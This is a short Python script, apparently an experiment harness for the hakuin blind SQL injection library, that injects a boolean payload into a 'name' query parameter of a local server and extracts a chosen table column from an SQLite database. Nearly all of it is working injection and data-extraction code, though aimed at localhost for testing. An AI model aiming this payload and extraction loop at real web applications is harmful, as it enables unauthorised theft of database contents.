import json
import requests
import sys

from hakuin.dbms import SQLite
from hakuin import Exfiltrator, Requester



class GenericDBRequester(Requester):
    def request(self, ctx, query):
        r = requests.get(f'http://127.0.0.1:8000/?name=NONEXISTANT" or ({query}) --')
        assert r.status_code in [200, 404], f'Unexpected resposne code: {r.status_code}'
        return r.status_code == 200



def main():
    assert len(sys.argv) >= 3, 'python3 experiment_generic_db.py <table> <column>'

    requester = GenericDBRequester()
    dbms = SQLite()
    exf = Exfiltrator(requester, dbms)

    res = json.dumps(exf.exfiltrate_text_data(sys.argv[1], sys.argv[2]), indent=4)
    # print(res)


if __name__ == '__main__':
    main()